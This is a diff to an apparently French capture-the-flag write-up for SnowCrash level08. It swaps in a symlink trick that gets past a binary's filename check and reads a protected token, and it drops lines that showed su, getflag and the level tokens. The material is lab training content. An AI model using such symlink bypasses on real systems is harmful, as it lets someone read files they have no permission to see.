@@ -40,16 +40,9 @@ exit(1 <unfinished ...>
 probleme concernant le nom de fichier!
 
 ```bash
-level08@SnowCrash:~$ chmod 777 .
-level08@SnowCrash:~$ mv token fake_token
-level08@SnowCrash:~$ ./level08 fake_tokens
+level08@SnowCrash:~$ ln -s token /tmp/secret
+level08@SnowCrash:~$ cat /tmp/secret
+cat: /tmp/secret: Permission denied
+level08@SnowCrash:~$ ./level08 /tmp/secret
 quif5eloekouj29ke0vouxean
-level08@SnowCrash:~$ su flag08
-Password:
-Don't forget to launch getflag !
-flag08@SnowCrash:~$ getflag
-Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-flag08@SnowCrash:~$ su level09
-Password:
-level09@SnowCrash:~$
 ```
